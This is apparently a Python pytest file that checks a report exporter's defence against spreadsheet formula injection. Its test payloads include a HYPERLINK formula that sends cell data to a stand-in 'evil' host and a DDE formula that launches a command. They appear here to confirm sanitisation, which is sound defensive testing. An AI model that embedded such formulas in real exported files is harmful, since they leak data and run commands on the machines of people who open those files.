"""Excel/CSV Formula Injection (CWE-1236) na exportação de relatórios."""

import io

import pytest

from app.utils.export import HAS_OPENPYXL, generate_excel_report, sanitize_cell


@pytest.mark.parametrize("payload", [
    '=HYPERLINK("http://evil/?d="&A1,"clique")',
    "+1+1",
    "-2+3",
    "@SUM(A1:A9)",
])
def test_prefixes_formula_payloads(payload):
    assert sanitize_cell(payload) == "'" + payload


@pytest.mark.parametrize("value", ["Maria Silva", "2026-08-31 10:00:00", "success", 42, None])
def test_leaves_normal_values_untouched(value):
    assert sanitize_cell(value) == value


@pytest.mark.skipif(not HAS_OPENPYXL, reason="openpyxl não instalado")
def test_excel_cell_is_text_not_formula():
    import openpyxl

    data = [{"Usuário": '=cmd|" /C calc"!A0', "Status": "success"}]
    workbook = openpyxl.load_workbook(io.BytesIO(generate_excel_report(data, "access_logs")))
    cell = workbook.active["A2"]

    assert cell.value.startswith("'=")
    assert cell.data_type == "s"  # string, não fórmula
